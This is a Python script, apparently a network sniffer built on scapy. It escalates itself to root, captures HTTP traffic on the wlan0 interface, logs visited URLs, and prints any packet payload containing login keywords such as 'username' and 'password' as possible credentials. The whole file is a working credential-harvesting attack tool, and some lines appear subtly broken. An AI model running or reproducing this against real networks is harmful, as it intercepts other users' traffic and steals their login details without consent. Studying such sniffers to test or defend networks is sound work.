import scapy.all as scapy
import os
import sys
from scapy.layers.http import HTTPRequest

euid = os.geteuid()
if euid != 0:
    print("Script not started as root. Running sudo..")
    args = ['sudo', sys.executable] + sys.argv + [os.environ]
    os.execlpe('sudo', *args)

print('Running. Your euid is', + euid)
print("---------------------------------------------------------")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processed_sniffed_packet, filter="port 80")


def geturl(packet):
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "password", "email", "pass", "login"]
        for keyword in keywords:
            if keyword in load:
                return load


def processed_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = geturl(packet)
        print("[+] HTTP Requests -->" + url.decode())
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password -->" + login_info.decode() + "\n\n")


sniff("wlan0")
